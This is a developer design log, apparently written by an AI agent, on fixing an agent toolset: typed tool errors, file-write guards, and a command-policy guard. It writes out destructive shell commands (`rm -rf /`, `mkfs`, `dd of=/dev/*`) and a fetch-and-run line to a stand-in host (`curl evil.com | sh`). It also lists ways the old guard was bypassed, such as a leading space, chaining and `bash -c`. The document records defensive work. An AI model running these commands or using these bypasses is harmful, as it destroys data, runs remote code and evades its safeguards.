# Toolset Issues & Improvement Wishes

Notes on the agent toolset in `tools/`, collected while building the
[feature map](featuremap.md). These are **my own observations as a user of the toolset**
(one of the agents configured in this repo), not a code review of the implementation.

Everything here was verified against the source at the time of writing. Where I am
inferring intent rather than reading it, I say so.

---

## Summary

| # | Area | Severity | Kind | Status |
|---|---|---|---|---|
| 1 | `browser` args are not quote-aware | **high** | bug | fixed |
| 2 | Tool error signalling is a string-prefix convention | **high** | design | fixed |
| 3 | `write` with empty content truncates silently | **high** | safety | fixed |
| 4 | Danger guard is disabled in mission mode | **high** | safety | fixed |
| 5 | Tool registry has no single source of truth | medium | design | fixed |
| 6 | `bash` subcommand router is a growing `switch` | medium | design | fixed |
| 7 | File tools have no read-before-write guard | medium | safety | fixed (partially, by design) |
| 8 | `read` silently truncates at 2000 lines | medium | design | fixed |
| 9 | Redundant file-mutation tools | low | design | fixed |
| 10 | No tool-result size limit | low | design | fixed |
| 11 | `browser`'s `args` is one opaque string | low | design | partially fixed |
| 12 | `help` output is a string, not a resource | low | ux | fixed |
| 13 | Window tools advertised but never registered | medium | bug | fixed |

---

## What landed (batch 1)

`tools/registry.go` is new and is now the single source of truth for the live
tool set. It follows the same idea pi uses: a tool should be able to find out
what it can do, without re-deriving conditional registration by hand.

- `AvailableTools()` / `AvailableToolCount()` / `ToolSchemas()` / `ToolSchemaNames()`
  / `ToolDescription(name)` — the live set, sorted.
- `RegistryIssues() []string` — reports *advertised but no handler*,
  *handler but not advertised*, and *duplicate schema*. Wired into
  `tools/registry_test.go`, so drift fails the build instead of surviving.
- `ToolsHelp()` — one line per live tool, plus any registry warnings.

Fixes:

- **#5 / #12** — `help` now leads with the live tool set and explicitly labels the
  bash subcommand vocabulary as *not* separate tools (`help tools` for just the
  list, `help <cmd>` for one subcommand). The old output listed subcommands
  while reading like a tool list, which is the trap described above.
  `FnMap` had to move from a package-level composite literal to `init()`
  assignments to avoid an initialization cycle (`getHelp → ToolsHelp →
  AvailableTools → FnMap`).
- **#13** — the window tools are registered under the names the removal code
  deletes (`list_windows`, `capture_window`, `capture_window_and_view`), so
  `removeWindowToolsFromBaseTools()` is no longer a no-op. The bash subcommands
  (`window`, `capture`, …) are now gated on the same availability flag, and
  `capture_window_and_view` is only advertised once vision support is known.
- **#1** — `browserCmd` uses the quote-aware `tokenize()` instead of
  `strings.Fields`, so `fill "#search" "hello world"` is expressible. The
  shorthand `browser "go https://x"` also works now.
- **#3** — `write` refuses empty content unless `truncate="true"` is passed
  explicitly, and reports a real truncation as such. Empty content is also
  flagged in the tool description.
- **#8** — `read` always returns a header naming the effective line range and
  whether it was truncated, not only when truncation happens.
- **#10** — `TruncateToolResult` caps a single tool result at
  `MaxToolResultBytes` (24 KiB), on a rune boundary, with a notice saying how to
  get the rest. Applied centrally in `CallToolWithAgent`.
- Unknown tool names now return an actionable error pointing at `help`, instead
  of `tool foo not found`.

---

## Batch 3: command policy (#4)

The guard was rebuilt. The finding that drove it was not the one this document
predicted.

### The bug that mattered: CLI mode deadlocked

`ConfirmChan` had exactly one consumer, the goroutine inside `initTUI()`.
`runCLIMode()` never starts it, and `RequestConfirmation` did an unguarded
channel send followed by a blocking receive. So `gf-lt --cli` plus any guarded
command — `rm`, `git push`, `sudo` — **hung the process** until it was killed.
The mode table in this document said CLI = "guard active"; it was worse than
inactive. There is a regression test for it
(`TestConfirmationDoesNotBlockWithoutAConsumer`).

### Two lists instead of one

The old design put `rm -rf /` and `rm build.log` in the same bucket, so the only
way to run unattended was to switch the guard off entirely. Now:

| | Needs a human? | Applies in mission? | Examples |
|---|---|---|---|
| **veto** | no | **yes** | `rm` outside the workspace or of a system path, `rm -rf .`, `mkfs*`, `dd of=/dev/*`, `shred` of a system path, recursive `chmod`/`chown` of a system path, `shutdown`/`reboot`, `git push --force`/`--delete`, `git clean -f` |
| **confirm** | yes | no (skipped) | `rm` in the workspace, `git push`, `git reset --hard`, `sudo`, `chmod -R`, `find -delete/-exec`, `dd` within the workspace |

A veto needs no human, so **mission mode loses nothing by honouring it** — which
is the whole point. Unattended operation still works; what it can no longer do is
destroy the machine.

### Matched over the parsed command

`IsDangerousCommand` prefix-matched the raw `args["command"]` string, so these
all walked past it:

```
  rm -rf /                    ← one leading space
echo hi && rm -rf /           ← not the first token
git -C /tmp push --force      ← git's own flags come first
find . -name '*.go' -delete   ← not in the list at all
git reset --hard              ← not in the list at all
```

The first two are not exotic escapes, they are how compound commands get
written. The new engine runs over `ParseChain` + `tokenize` — machinery that
already existed — so segment boundaries, combined short flags (`-rf`), and
git's global-flag skipping fall out of parsing rather than each needing their
own special case.

### Confirmation cannot hang

`RequestConfirmation` is default-deny at every step: no registered consumer →
deny immediately (no channel round trip at all); buffer full → deny; consumer
registered but dead → deny after `ConfirmTimeout`. The TUI calls
`RegisterConfirmConsumer()` when its prompt loop starts.

### One check, not three

The check moved from the two `bot.go` call sites into `EnforceCommandPolicy`,
called at the top of the `bash` tool before dispatch. The modern `/v1/chat` path,
the legacy `/completion` path, and the bash subcommand router are all covered by
one implementation, so they cannot drift apart.

### Known remaining gap

The veto list reasons about *the command*, not about what it can reach. `cp x
/etc/cron.d/y` or `sed -i /etc/hosts` are not caught, because `execSingle` runs
with `cmd.Dir = cfg.FilePickerDir` but does not sandbox what a process may touch.
Closing that means a real sandbox (namespaces, seccomp, or a container), not a
longer blocklist. The file tools already enforce the root via `resolvePath`; the
shell does not.

---

---

## Batch 4: two-tier router (#6)

### What pi does

pi's bash tool has no router at all. It is one line:

```js
spawn(shell, [...shellArgs, command], { cwd })
```

No allowlist, no denylist, no confirmation, no interception. `ls` is not a pi
tool and `grep` is not a pi tool - they are arguments to bash. The controls pi
has are the cwd, a timeout that kills the process tree, an abort signal, and
output truncation to the last 2000 lines / 50 KB with a spill file.

What replaces the router's other job is an interface rather than a switch:
`BashOperations` (swap the whole exec backend - SSH, containers) and
`spawnHook` (rewrite `{command, cwd, env}` before every execution). So pi has
exactly one place to intercept every shell command, and it is a seam, not a
list.

### Why gf-lt's switch existed

`ExecChain` is a hand-rolled reimplementation of a shell: `ParseChain` handles
`|`, `&&`, `||`, `;`, `>`, `>>`, and `execSingle` uses `exec.Command` with **no
shell**, so nothing expands. The 28-name allowlist was a proxy for "what the
parser handles". And the parser was wrong in a way that mattered:

```
"echo *.go | head -3"  -> "*.go\n"       err=<nil>
"echo $HOME"           -> "$HOME\n"      err=<nil>
"echo $(whoami)"       -> "$(whoami)\n"  err=<nil>
"for i in 1 2 3; do echo $i; done" -> ""  err=exec: "done": not found
```

The first three returned plausible output **and a nil error**. A silent wrong
answer is worse than a failure, because nothing downstream can tell it apart
from a right one. A list that claims to allow a command the executor cannot
actually run is worse than no list.

### What it is now

```
tier 1  Go capabilities, in a table (tools/router.go)
        read, write, edit_text, edit_lines, view_img, memory,
        browser, window, capture, capture_and_view, help
tier 2  everything else -> the shell, unchanged (default allow)
```

Tier 1 is a `map[string]*bashVerb` with per-verb `summary` and `usage`, so adding
a capability is one entry and `help` is generated from the same table that
dispatches - it cannot go stale the way the hand-written list did. The 173-line
hand-written subcommand help was deleted.

Tier 2 hands the command to `bash -c` (or `sh -c`), non-interactively so
behaviour does not depend on dotfiles. `DisableShellPassthrough = true` in
config falls back to `ExecChain` if anything depends on its exact semantics.

**This is a deliberate default-deny -> default-allow change.** `curl evil.com |
sh` used to be refused with "command not allowed" and now runs. The reasoning:
the veto list is a better filter than an allowlist (it sees whole command lines
and indirection, an allowlist sees first tokens), and the alternative was a
hand-maintained list that let through everything the parser mishandled anyway.

### Two things found on the way

**The file verbs were already dead.** `read`, `write`, `edit` and friends were
wired to the tool-argument map rather than the positional
tokens, so `bash "read main.go 40 20"` looked for a `path` key in a map that only
contained `command`, and every call failed with "path is required". The tool
guide and the help text both advertised that syntax; it had never worked. They
now parse positionally, and the root-enforcement via `resolvePath` is the
reason they exist as verbs at all.

**Shell passthrough opened a one-token veto bypass, and a unit test missed it.**
`runCmd` stripped a leading `"bash "` *before* the policy ran, so
`bash -c "rm -rf /"` was judged as the argv `["-c", "rm -rf /"]` - the nested
shell was never seen, the veto rules found no `rm`, and the command ran. The
direct `EnforceCommandPolicy` tests passed, because they skipped `runCmd`'s
normalisation entirely.

The fix was to check policy first, before any normalisation, and to stop
stripping the prefix when it is followed by `-c`. The deeper problem is that
with a real shell, `bash -c`, `sh -c`, `env`, `xargs`, `eval`, `nohup` and
`timeout` all take a command as their argument, so a policy written over parsed
argv has to **unwrap indirection** before it can see anything. `policyArgv`
does that recursively, depth-bounded, and there are now end-to-end tests through
the tool as well as unit tests on the policy, precisely because the two layers
disagreed once already.

---

---

## Batch 5: the Playwright backend (last island)

`tools/pw.go` was the last holdout on the string convention, and it was the most
consequential one, because of what its failures meant.

### Browser failures counted as successes

69 return sites emitted success-shaped JSON with an `error` key and a **nil Go
error**:

```go
return []byte(`{"error": "Browser not started. Call pw_start first."}`)
return []byte(fmt.Sprintf(`{"error": "failed to click: %s"}`, err.Error()))
```

So `IsFailure(err)` was false, and `ExecuteOneToolCall` called
`ResetFailures()`. A mission solver could fail to navigate, fail to click, fail to
find any element, and its failure counter would sit at zero. It was also the last
real consumer of `IsToolError`'s `strings.Contains(resp, "\"error\"")` — the
heuristic batch 2 deleted. After that deletion, browser failures were invisible
to the host entirely. This batch is what fixed it.

### Classification, not mechanical wrapping

69 sites are not 69 errors. Two were idempotent no-ops, and inconsistent with
each other:

```go
pwStart, browser already running  ->  {"error": "Browser already started"}   // was an error
pwStop,  browser already stopped  ->  {"success": true, "message": "..."}   // was a success
```

Wrapping mechanically would have made `browser start` on a running browser
spend one of three mission strikes for doing the right thing. `pwStart` now
returns a success, matching its mirror.

### A stale command name, 13 times

```
{"error": "Browser not started. Call pw_start first."}
```

There is no `pw_start` tool, no `pw_start` bash verb, no `pw_start` browser
action. The verb is `start`. The model was told to run a command that does not
exist, thirteen times, in the one situation where it could not guess. It is now
one function with one typed hint, and a test asserts the old literal is gone
from the file.

### Where `([]byte, error)` actually pays

`pwExtractText` loops over N elements and skipped any that failed to read:

```go
for i := 0; i < count; i++ {
    text, err := locator.Nth(i).TextContent()
    if err != nil { continue }     // silently dropped
    texts = append(texts, text)
}
```

A node can vanish between `Count()` and `TextContent()` on a live page, so
partial extraction is the *normal* case, and the old code made it
indistinguishable from "extracted nothing useful". It now returns the text
alongside a `conflict` error saying how many of how many failed.

### Multimodal: option (b)

A multimodal result is recognised downstream by its prefix
(`{"type":"multimodal_content"` - `bot.go`), so a prepended `[tool_error: …]`
header would turn the image into unreadable text. Chosen arrangement: the error
rides **inside** the payload as a leading text part, and the handler still
returns a real error to the host.

```go
parts := append([]map[string]string{MultimodalErrorPart(err)}, resp.Parts...)
```

`RenderToolResult` detects a multimodal payload and leaves it alone, so the two
formats can never collide. `bot.go` needed no change: it walks the `parts` array
and passes text parts through.

### Result

`pass()`, the adapter that erased all of this, is deleted.

---

## Batch 6: the error contract moves to `models`

The five remaining sites on the old convention were all in `agent/pw_tools.go`,
which cannot import `tools` without a cycle (`tools` already imports `agent`).
So the type moved instead.

`ToolError` was never really a `tools` concept. It describes how a **tool result
is rendered into a message**, which is the same contract `RoleMsg`,
`ToolCall` and `MultimodalToolResp` already live under in `models` - the
package the feature map calls "the shared vocabulary package that everything
depends on". It now lives there with its codes, its constructors, its
classification helpers (`IsFailure`, `ErrorCodeOf`), and the rendering
(`RenderToolResult`, `IsMultimodalPayload`, `MultimodalErrorPart`).

The dependency now points one way, so `agent` can produce the same errors the
`tools` package does, and its five sites are converted:

```go
return models.RenderToolResult(name, nil, &models.ToolError{
    Code: models.CodeUnknownTool,
    Msg:  fmt.Sprintf("no such tool: %q", name),
    Hint: "call the help tool to see what is available",
})
```

What stayed in `tools/errors.go` is the tool-specific part: `MaxToolResultBytes`,
`TruncateToolResult`, and `readError` (which turns an OS error from a
filesystem path into the right classification).

`mustMarshalJSON` was the last miniature of the old idea - it swallowed a
marshal failure into an `{"error": ...}` body and returned it as a success. It
propagates now.

### The convention is now enforced

`tools/convention_test.go` walks the source and fails the build on any `return`
that hands back a string which merely *looks* like an error:

```
handlers must return an error, not a string that looks like one:
      ../tools/tools.go:470: return []byte(`{"error": "` + msg + `"}`)
```

That check is worth more than it looks. The convention was load-bearing but
invisible: there was no compiler error for reintroducing it, only a failure the
host could no longer see. Two batches of bugs came from it - the browser backend
counting every failure as a success, and `mustMarshalJSON` doing the same - and
neither would have been caught by anything except a test that looks.

---

## Batch 7: three file-mutation tools (#9)

The issue filed this as "four near-synonyms, the choice is arbitrary". The count
was the symptom. I counted the recorded calls first, and the roster sorted itself:

```
 126  file_edit      replace a whole function, by line range
  17  edit           one graphviz attribute, a README badge, a markdown row
   8  write          create a new file - a script, a .dot source
   4  insert_at      append to the end of a test file (lines 18, 22, 24, 27)
```

Three distinct intents, not four. The discriminator is **how the caller addresses
the target**, and that is what the names now say:

| tool | addresses by | use when |
|---|---|---|
| `write` | the whole file | creating, or a deliberate full rewrite |
| `edit_text` | quoted text | a small, distinctive change you can reproduce exactly |
| `edit_lines` | line numbers | anything multi-line, or anything you can only find by number |

`edit` and `file_edit` are **not** merged, and the reasoning matters: they have
different cost curves (quoting 40 lines back byte-for-byte is where models fail)
and different safety properties (`edit_text` refuses an ambiguous match;
`edit_lines` does not). Merged into one tool with two modes, the unique-match
guarantee would become conditional - and a conditional safety property is one a
model learns to route around.

`insert_at` is gone. Every recorded use was an append, and `edit_lines` already
appends at `start_line` one past the last line. The one capability that is *not*
reproducible - a non-destructive mid-file insert - was never used, and
`edit_lines` with an empty `new_content` covers deletion instead.

`TestFileMutationRoster` pins all of this, including that `edit`, `file_edit` and
`insert_at` are gone from the schema set, the verb table *and* `FnMap`, and
`TestEditToolDescriptionsStateTheDecisionRule` requires each description to point
at the other.

### A false statement in a tool result

`edit_lines` at the append position reported `deleted 1 lines`. It had deleted
nothing: a trailing newline splits into a phantom empty element, and the message
counted that. Same class of defect as the browser backend's nil errors - a
statement in a tool result that isn't true - and it only showed up because this
issue asked to look at these three tools. It now reports an append as an append,
and a start genuinely past the end of the file is refused rather than clamped.

---

---

## Batch 8: `write` guards (#7)

The issue asked for an `expect_sha` / `expect_mtime` on the file tools, framed as
a read-before-write guard. The framing was worth pushing back on, and the part
that survived is narrower.

### Why not a read-before-write precondition

**It tests the agent's process, not the world.** The hazard is not "the model
didn't look" - it is "the model's belief was stale when the write committed." A
read fifty turns ago satisfies the gate and leaves the hazard exactly where it
was.

**It is gameable and expensive to define honestly.** The content can legitimately
come from `bash cat`, from `edit_lines`' output, from a file the agent just
generated. So the gate has to be narrow - *did you call `read` on this exact
path* - which is simultaneously trivial to satisfy without being safe and
annoying to satisfy honestly.

**It manufactures confidence, which is the real cost.** A passing preflight reads
to the model as *this write is verified*. Nothing was verified. That is worse
than no gate, because it suppresses the instinct to re-read - the thing that
would actually have caught the problem.

### What `write` has that the others do not

Not staleness. **Recoverability from the arguments.**

| | do the arguments determine what survives? |
|---|---|
| `edit_lines` | yes - you replaced `[a,b)` with X |
| `edit_text` | partly - a stale match usually fails outright |
| `write` | **no** - `write(path, content)` references nothing about the old content |

That asymmetry is why `write` gets protection the other two do not need, and it
is a different argument than the one the issue made.

### What landed

**1. The result reports the blast radius.** `write` used to `os.Stat` nothing and
report only what it wrote - `wrote f.go (3 lines, 84 bytes)`. It now describes
the target first:

```
wrote f.go (1 lines, 5 bytes; was 200 lines, 1000 bytes)
created g.txt (1 lines, 5 bytes)
```

The most common agent failure here is not a stale write. It is reaching for
`write` and replacing a 400-line file with a 3-line stub - and nothing about
that call is wrong, so the fact has to live in the result. A file too large to
read cheaply is described in bytes, which is still enough.

**2. Overwriting a non-empty file requires `overwrite="true"`.** Same shape as
the `truncate` opt-in. The refusal names the opt-in and points at the right tool
for partial changes:

```
[tool_error: conflict] refusing to overwrite f.go (200 lines, 1000 bytes) with
write; pass overwrite="true" to replace it
hint: to change part of a file, edit_text (quote the old text) or edit_lines
(name a line range) instead - both keep the rest of the file
```

The bash verb form passes `overwrite="false"` explicitly, so the positional
syntax stays a create-only shorthand and existing files are reported rather than
replaced.

### A correction to batch 2

Both refusals are now `CodeConflict`, where the truncate refusal shipped as
`CodeDenied`. The `denied` code exists for refusals the model cannot retry its
way out of - and carries no hint by construction, precisely because a hint
there invites a blind retry. Both of these are fixable in one argument. Charging
a mission failure for a mistake a guard caught cheaply would be wrong, and so
would implying the model is stuck.

`expect_sha256` was **not** added. It is the right shape for real staleness - a
claim about the world rather than a gate on the agent - and the `conflict` code
to report a mismatch now exists, but it should be wired only where there is a
concurrent mutator to detect. In this codebase that means mission mode with
user chat input, plus `gofmt -w` touching files mid-run. Adding it everywhere
would be an unused parameter.

Still open:

- **#11**: `browser`'s `args` is still one opaque string, partly fixed in batch 1.
- The shell tier does not enforce the fs root; only the tier-1 file verbs do.
  That asymmetry is real and documented, and closing it needs a sandbox rather
  than a longer blocklist.
  That asymmetry is real and documented, and closing it needs a sandbox rather
  than a longer blocklist.

---

## Batch 2: typed tool errors (#2)

`FnHandler` now returns `([]byte, error)`, and `IsToolError` — the string-sniffing
heuristic this document complained about — is deleted.

`tools/errors.go` holds the whole convention:

```go
type FnHandler func(args map[string]string) ([]byte, error)

type ToolError struct {
    Code ErrorCode // invalid_args | not_found | conflict | denied | unknown_tool | unavailable | internal
    Msg  string    // one line, model-facing
    Hint string    // optional: what to try instead
    Err  error     // wrapped cause — logged, never shown to the model
}
```

**How the error reaches the agent.** It is still a string: an OpenAI tool-result
message has no error channel, so there is nothing else it could be. What changed
is that exactly one function decides what the model sees, and what the model sees
is a fixed prefix at position 0:

```
[tool_error: not_found] nope/missing.md does not exist
hint: list the containing directory to get the exact name
```

The choice of a prefix rather than a JSON envelope, and the reasoning for it, is
in the design notes for that change. In short: position beats shape (an error
buried in a 40-line output gets skimmed), and a fixed prefix at offset 0 cannot
false-positive on content the way `strings.Contains(resp, "cannot use")` did.

Four properties worth calling out:

- **Output survives the error path.** `[]byte` and `error` are independent. A `go
  test` that fails still returns the compiler's output, which is the reason the
  model ran the command. The old `[error]` prefix implied "discard the rest".
- **`internal` never leaks its cause.** `Err` goes to the log; the model gets
  `[tool_error: internal] <what we were doing>` and nothing else. Several former
  sites did `fmt.Sprintf("[error] %v", err)`, which leaked internal paths and
  error text verbatim.
- **Hints only where a different call would work.** `denied` carries no hint by
  construction — a refusal is not agent-fixable, and a hint there just invites a
  blind retry.
- **`denied` and `unknown_tool` are not failures.** `IsFailure()` returns false
  for both, so mission bookkeeping no longer spends a failure on a correctly
  refused command or on a hallucinated tool name. Charging for either teaches a
  mission solver to look for workarounds, which is the opposite of the intent.

`ExecChain` also returns `(string, error)` now, and reports a non-zero exit as a
`conflict` with the command output attached. That is what replaces the
`strings.Contains(resp, "\nFAIL\n")` heuristic: the shell layer knows how a
command ended, so it says so, instead of a later pass guessing from the text.

Callers in `bot.go` now branch on the returned error rather than on rendered
text:

```go
if tools.IsMissionMode() {
    switch {
    case toolErr == nil:                    ResetFailures()
    case tools.IsFailure(toolErr):          AddFailure()
    default:                                // denied: neither failure nor success
    }
}
```

`mcp/` grew exported constructors (`NewToolError`, `NewToolNotFound`,
`NewToolInternal`, `NewDenied`) because the MCP bridge is a tool provider outside
the `tools` package and has to speak the same convention.

Not migrated: the Playwright helpers in `tools/pw.go` still return plain
`[]byte`; they are adapted through `pass()` at the router. They are the last
island and are worth doing for the same reason everything else was.

---

## 1. `browser` args are not quote-aware — HIGH

`runCmd` (the `bash` tool) correctly uses the quote-aware `tokenize()`:

```go
// tools/tools.go:417
parts := tokenize(commandStr)
```

This was a deliberate fix, called out in `docs/auto-issue-solver.md` under P8
("Quoting fix"), specifically so `git commit -m "fix: message"` would parse.

`browserCmd` did **not** get the same treatment:

```go
// tools/tools.go:473
browserArgs = strings.Fields(argsStr)
```

`strings.Fields` splits on any whitespace, so quoted arguments containing spaces are
destroyed. The documented usage is:

```
browser fill <selector> <text>
```

So this is broken for its primary use case:

```
browser fill "#search" "hello world"     →  args become: "#search" "hello" "world"
browser fill "#search" hello world       →  same, indistinguishable
```

The second form is indistinguishable from the first, and the LLM has no way to express
"fill this with a multi-word string". There is no escape and no error — it silently
truncates the input.

**Wish:** `browserCmd` should use `tokenize()` like `runCmd` does. Ideally the raw
subcommand string would be tokenized once, rather than each tool re-implementing
splitting.

---

## 2. Tool error signalling is a string-prefix convention — HIGH

This is the one I keep tripping over, and I suspect other agents do too.

Tool handlers return `[]byte`. There is no error channel. Success and failure are
distinguished **only** by matching on the shape of the returned string:

```go
// tools/mission_tools.go:541
func IsToolError(toolName, resp string) bool {
    trimmed := strings.TrimSpace(resp)
    if strings.HasPrefix(trimmed, "[error]") { return true }
    if strings.HasPrefix(trimmed, "{") && strings.Contains(trimmed, `"error"`) { return true }
    ...
}
```

Consequences:

- **A tool cannot fail loudly.** Any handler that forgets the `[error]` prefix is
  silently treated as success by mission mode's failure tracking.
- **The convention is load-bearing but undocumented.** There is no godoc comment on
  `FnHandler` saying "return `[error] ...` to signal failure". The rule exists only
  discoverable by reading `IsToolError` in a different file, in a different feature.
- **The JSON heuristic is fragile.** `strings.Contains(trimmed, '"error"')` will
  return `true` for a *successful* response whose payload merely mentions the word —
  e.g. a `write` of a file whose contents include the string `"error"`, or any
  tool echoing back user content.
- **It is only consulted in mission mode.** Outside mission mode the prefix is
  decorative and nothing reads it.

**Wish:** change `FnHandler` to return `([]byte, error)`. The `CallToolWithAgent`
signature already returns `(raw []byte, ok bool)`, so there is a precedent for a
second return value — the bool currently means "agent found a processor", not
"did it work", which is its own confusion.

Related: `CallToolWithAgent` returns `false` for an unknown tool, and callers
(`handleBatchToolCalls`) treat that as a mission failure. An LLM hallucinating
a tool name therefore burns one of only 3 allowed failures. That is arguably
correct, but a typo'd tool would be indistinguishable from a real problem.

---

## 3. `write` with empty content truncates silently — HIGH

`write` validates `file_path` but says nothing about `content`:

```go
// tools/edit.go:156
if filePath == "" { return "[error] file_path not provided" }
// ... no check that content is non-empty
if err := os.WriteFile(abs, []byte(content), 0644); err != nil { ... }
```

So `write` with `content: ""` truncates the target to zero bytes. For a coding
agent this is the single most destructive possible mistake, and it is
indistinguishable from "successfully cleared the file" in the return value:

```
wrote main.go (0 lines, 0 bytes)
```

`IsToolError` does not catch it — no `[error]` prefix, not JSON, no `FAIL`.

The neighbouring tools *do* guard empty input (`insert_at` and `edit` both reject
empty required strings), so this looks like an omission in `write` rather than a
deliberate policy.

**Wish:** `write` should refuse empty `content`, or require an explicit
`truncate: true` opt-in. At minimum the return value should not read like a
routine success. Relatedly, "delete this file" is currently expressible *only* as
`write` with empty content, which is exactly the wrong affordance — `rm` should
be the honest spelling, and it's already available via `bash`.

---

## 4. The danger guard is disabled in mission mode — HIGH

There is a confirmation prompt for destructive commands, and it is well built:

```go
// tools/dangerous.go:16
func IsDangerousCommand(name string, args map[string]string) (bool, string)
// blocklist: rm, git push, sudo, dd, shred, mkfs, fdisk, shutdown,
//            poweroff, reboot, iptables, ufw, chmod -R, chown -R
```

But both call sites gate it on `!tools.IsMissionMode()`:

```go
// bot.go:1605  (executeOneToolCall — the modern /v1/chat path)
// bot.go:1901  (findCall — the legacy /completion path)
if !tools.IsMissionMode() {
    if dangerous, label := tools.IsDangerousCommand(...); dangerous {
        approved := tools.RequestConfirmation(req)
        ...
    }
}
```

and

```go
// tools/mission_tools.go:39
func IsMissionMode() bool { return currentMission != nil }
```

`currentMission` is set only by `runMissionMode()`. So:

| Mode | Guard active? |
|---|---|
| TUI | yes |
| CLI (`--cli`, `--msg`) | yes |
| Mission (`--mission`) | **no** |

I want to be clear that I read this as *intentional* — an autonomous solver that
has to stop and ask a human before every `rm` cannot function unattended, and
`SIGINT`/checkpointing already exist as the escape hatch. There is also a
`workflow.guardrails.block_patterns` concept in the agent card for card-level
policy. So this is not a bug.

**The complaint is about the blast radius.** In mission mode the LLM holds a
`bash` tool with no confirmation and no blocklist, pointed at a real repository.
The safety properties that the rest of the toolset is careful about —
`resolvePath`'s root-escape checks, `edit`'s unique-match requirement — all still
hold, but nothing stops `rm -rf`, `git push`, or `git reset --hard` at the
execution layer. The only backstop is `git` itself, and only if a human made a
commit first.

Worth noting the blocklist is prefix-matched on the raw command string, so
`sh -c 'rm -rf /'`, `$(rm x)`, or `find . -delete` all bypass it — but that's
moot in mission mode anyway, and is a general property of prefix blocklists
rather than a defect in this design.

**Wish:** a middle path. Options, roughly in order of effort:

- Keep mission mode unconfirmed, but honour the agent card's
  `guardrails.block_patterns` (`docs/auto-issue-solver.md` already describes the
  concept) as a hard veto, with a message explaining the denial. This gives the
  card author real authority instead of advisory text.
- Require an explicit opt-in flag for the genuinely irreversible subset
  (`rm -rf /`, `git push --force`, `git reset --hard`) rather than everything.
- Log every blocklisted command in mission mode even though it isn't prompted, so
  the mission transcript is reviewable after the fact.

None of these require a human in the loop for ordinary work.

---

## 5. Tool registry has no single source of truth — MEDIUM

The set of available tools is assembled from at least four separate places:

| Where | What it adds | When |
|---|---|---|
| `FnMap` literal | ~18 base tools | always |
| `FnMap["memory"]` | `memory` | `MemoryEnabled` |
| `RegisterMissionTools()` | 4 mission tools | `--mission` / `--mission-tools` |
| `removeBrowserTools()` | *removes* `browser` | Playwright off |
| `checkWindowTools()` | *removes* 3 window tools | `xdotool`/`maim` missing |
| `mcp.RegisterToolHandlers()` | `mcp_<server>_<tool>` | any MCP server |

To answer "what can the agent do right now?" you have to read all of the above and
apply conditional logic. There is no function that enumerates the live set.

This is a real operational cost: I have to reason about *this* machine's state
(is Playwright installed? are `xdotool` and `maim` present?) to predict my own
capabilities. I cannot simply be told.

**Wish:** an explicit accessor, e.g.

```go
func AvailableTools() []string  // sorted live set
func ToolSchemas() []models.Tool // what we advertise to the LLM
```

Then a `help` tool that lists them would be genuinely self-describing, and the
`BaseTools` / `MissionBaseTools` bookkeeping could be asserted in a test. Today
there is no test that catches "we advertise a tool whose handler is missing".

**Related, and a concrete symptom of this:** `help` does not list tools. It lists
the *subcommand vocabulary* of the `bash` tool:

```
Available commands:
  help <cmd>     - show help for a command (use: help memory, help git, etc.)
  # File operations
  ls [path]       - list files in directory
  ...
  # Git (read-only)
  git <cmd>       - git commands (status, log, diff, show, branch, etc.)
  ...
  # Window (requires xdotool + maim)
  window              - list available windows
```

Those are not separate tools. They are dispatched inside `runCmd`:

```go
// tools/tools.go:458
case "mkdir", "ls", "cat", "stat", "pwd", "cd", "cp", "mv", "rm", "sed",
     "grep", "head", "tail", "wc", "sort", "uniq", "echo", "printf", "time",
     "go", "find", "file", "git", "magick", "which":
    return executeCommand(args)
default:
    return []byte("[error] command not allowed. Run 'help' tool to see available commands.")
```

So the `help` output reads as a tool list but is a subcommand list. An agent that
takes it at face value and calls a "tool" named `ls` gets told to run `help` —
having just been given the documentation. This is a real trap, and it is exactly
the confusion an `AvailableTools()` accessor would resolve.

Note also the help text advertises `window` / `capture` / `capture_and_view`
unconditionally, even though those tools are deleted from `FnMap` when
`xdotool`/`maim` are missing. So `help` is stale in both directions: it lists
things that aren't tools, and doesn't mention the ones that are.

**Wish:** split the two concerns — `help` (or a new `tools` tool) should list the
live `FnMap` set with one line each, and the `bash` subcommand vocabulary should be
documented as *part of the bash tool's description* or under a separate
`help bash`.

---

## 6. `bash` subcommand router is a growing `switch` — MEDIUM

```go
// tools/tools.go:424
switch subcmd {
case "help": ...
case "memory": ...
// ... more
}
```

`runCmd` is a general dispatcher that fronts several subsystems. Every new shell-ish
verb is another `case`. Meanwhile the browser verbs are a *second*, parallel router
(`runBrowserCommand`) that `browserCmd` wraps.

**Wish:** a `map[string]FnHandler` keyed on subcommand, populated at init, so adding
a verb is a one-line registration rather than a switch arm in the middle of a
200-line function. This is also the natural place to hang per-verb metadata
(help text, arg spec, whether it needs a confirmation).

---

## 7. File tools have no read-before-write guard — MEDIUM

`edit` requires `old_text` to appear exactly once, which is a good
safety property — ambiguous matches are rejected rather than guessed. But the
other mutation tools have no equivalent:

- `write` — unconditional overwrite
- `insert_at` — unconditional insert
- `file_edit` — replaces a line range outright

So a stale `edit` fails loudly (good), while a stale `write` succeeds silently
and clobbers whatever a human or another process put there. Given this is a tool
an autonomous agent holds, and `git` is the only backstop, an optional
`expect_sha` / `expect_mtime` argument would be cheap and would close the
optimistic-concurrency gap.

---

## 8. `read` silently truncates at 2000 lines — MEDIUM

```go
// tools/edit.go
limit := 2000
if limStr := args["limit"]; limStr != "" { ... }
...
result := strings.Join(lines[startIdx:endIdx], "\n")
remaining := totalLines - endIdx
if remaining > 0 {
    result += fmt.Sprintf("\n[%d more lines in file. Use offset=%d to continue.]", remaining, endIdx+1)
}
```

This is good — it tells me how to continue. But the default of 2000 lines is
applied *silently* when `limit` is omitted, so a large file comes back looking
complete-ish. I only notice because of the trailer. A large file that happens
to be exactly ≤2000 lines and a truncated one are hard to tell apart at a glance.

**Wish:** always state the effective limit in the response header, not only when
truncation occurs.

---

## 9. Redundant file-mutation tools — LOW

There are four ways to change file content:

- `write` — full overwrite
- `edit` — exact string replace, must be unique
- `file_edit` — replace line range `[start_line, end_line]`
- `insert_at` — insert before line N

`edit` and `file_edit` overlap heavily. In practice I reach for `edit` (unique-match
gives it a safety property) or `file_edit` (line ranges are stable for generated
files). Four near-synonyms means the choice is arbitrary and gets re-litigated
every session. I don't think this needs fixing urgently — but two of the four
could probably merge, and a note in each description about *when to prefer it*
would remove most of the hesitation.

---

## 10. No tool-result size limit — LOW

Tool output goes straight into the chat context. `read` is bounded (see #8), but:

- `bash` output is unbounded
- `read_url` / `websearch` are unbounded
- `view_img` / `screenshot` return base64

A single `cat` of a large file, or a screenshot, can blow a meaningful fraction of
the context window with one tool call. In mission mode this interacts badly with
